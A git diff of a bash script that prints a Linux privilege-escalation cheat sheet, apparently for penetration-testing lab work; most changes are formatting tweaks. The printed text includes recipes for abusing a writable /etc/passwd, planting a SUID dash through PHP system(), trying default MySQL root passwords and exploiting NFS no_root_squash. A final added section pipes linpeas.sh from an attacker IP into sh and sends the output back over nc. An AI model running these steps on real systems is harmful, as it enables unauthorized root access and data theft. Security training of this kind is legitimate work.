@@ -1,6 +1,4 @@
 #!/bin/bash
-Notes Taken from s1ren
-https://sirensecurity.io/blog/linux-privilege-escalation-resources/
 
 bold=$(tput bold)
 normal=$(tput sgr0)
@@ -23,11 +21,11 @@ printf "stty columns 200 rows 200\n\n"
 
 printf "%0.s=" {1..79}
 printf "\n\n$Blue[+ Kernal Payloads (Last Resort but notable information)]${normal}\n"
-printf "$Blue[++ What Arch?]${normal}\n"
+printf "$Blue[+ What Arch?]${normal}\n"
 printf "file /bin/bash\n"
-printf "$Blue[++ Kernal]${normal}\n"
+printf "$Blue[+ Kernal]${normal}\n"
 printf "uname -a\n"
-printf "$Blue[++ Issue/Release?]${normal}\n"
+printf "$Blue[+ Issue/Release?]${normal}\n"
 printf "cat /etc/*-release\n"
 printf "cat /etc/issue\n\n"
 
@@ -58,10 +56,12 @@ printf "$Red Any .conf files? ssh keys? Interesting files?${normal}\n\n"
 printf "%0.s=" {1..79}
 
 printf "\n\n$Blue[+ Check */www for interesting files/directories: Web Configs Containing credentials?]${normal}\n"
-printf "ls -lsaht /var/www\n\n"
+printf "ls -lsaht /var/www\n"
+printf "find /var/www -name config.php\n\n"
 
 printf "$Blue[+ Check */www/html for interesting files/directories: Web Configs containing credentials]${normal}\n"
-printf "ls -lsaht /var/www/html\n\n"
+printf "ls -lsaht /var/www/html\n"
+printf "find /var/www/html -name config.php\n\n"
 
 printf "%0.s=" {1..79}
 
@@ -99,15 +99,15 @@ printf "$Red Looking for anything not root:root or root:shadow${normal}\n"
 printf "$Red Except: cups${normal}\n\n"
 
 printf "$Blue[+ Any .config files in /etc ?]${normal}\n"
-printf "ls -lsaht /etc/ |grep -i ‘.conf’ --color=auto\n\n"
+printf "ls -lsaht /etc/ |grep -i '.conf' --color=auto\n\n"
 
 
 printf "$Blue[+ Any .secret files in /etc ?]${normal}\n"
-printf "ls -lsaht /etc/ |grep -i ‘.secret’ --color=auto\n\n"
+printf "ls -lsaht /etc/ |grep -i '.secret' --color=auto\n\n"
 
 printf "$Blue[+ Is passwd writable?]${normal}\n"
 printf "ls -lsa /etc/passwd\n"
-printf "$Blue[++ Exploit writable passwd file]${normal}\n"
+printf "$Blue[+ Exploit writable passwd file]${normal}\n"
 printf "openssl passwd -1\n"
 printf "<Enter A Password>\n"
 printf "$Blue copy hash output${normal}\n"
@@ -169,7 +169,7 @@ printf "%0.s=" {1..79}
 
 printf "\n\n$Blue[+ With file that has root priv but you are able to write and execute, we can exploit bash]${normal}\n"
 printf "PHP: system(\"cp /bin/dash /var/tmp/dash ; chmod u+s /var/tmp/dash\");\n"
-printf "$Blue[++ Execute File]${normal}\n"
+printf "$Blue[+ Execute File]${normal}\n"
 printf "/var/tmp/dash -p\n\n"
 
 printf "%0.s=" {1..79}
@@ -195,7 +195,7 @@ printf "%0.s=" {1..79}
 
 printf "\n\n$Blue[+ MYSQL Credentials? Root Unautorized Access?]${normal}\n"
 printf "mysql -u root -p\n"
-printf "$Blue[++ Password Options]${normal}\n"
+printf "$Blue[+ Password Options]${normal}\n"
 printf "root\n"
 printf "toor\n"
 printf "<blank>\n\n"
@@ -204,17 +204,17 @@ printf "%0.s=" {1..79}
 
 printf "\n\n$Blue[+ Can we exploit weak NFS Permissions?]${normal}\n"
 printf "cat /etc/exports\n"
-printf "$Blue[++ Look for following setting]${normal}\n"
+printf "$Blue[+ Look for following setting]${normal}\n"
 printf "no_root_squash\n"
 printf "$Red https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe/${normal}\n"
-printf "$Blue[++ ATTACK Machine]${normal}\n"
+printf "$Blue[+ ATTACK Machine]${normal}\n"
 printf "mkdir -p /mnt/nfs/\n"
 printf "mount -t nfs -o vers=<version 1,2,3> $IP:<NFS Share> /mnt/nfs/ -nolock\n"
 printf "gcc suid.c -o suid\n"
 printf "cp suid /mnt/nfs/\n"
 printf "chmod u+s /mnt/nfs/suid\n"
 printf "su <user id matching target machine's user-level privilege.>\n"
-printf "$Blue[++ Victim Machine]${normal}\n"
+printf "$Blue[+ Victim Machine]${normal}\n"
 printf "./suid\n\n"
 
 printf "%0.s=" {1..79}
@@ -223,4 +223,7 @@ printf "\n\n$Blue[+ Find every single file ever created by user]${normal}\n"
 printf "find / -user <USER_NAME> 2>/dev/null\n\n"
 
 printf "%0.s=" {1..79}
-                      
+
+printf "\n\n$Blue[+ linpeas From Memory]${normal}\n"
+printf "${Blue}Host:${normal} nc -nlvp 9002  | tee linpeas.out\n"
+printf "${Blue}Victim:${normal} curl 192.168.119.217/linpeas.sh | sh | nc 192.168.119.217 9002\n\n"
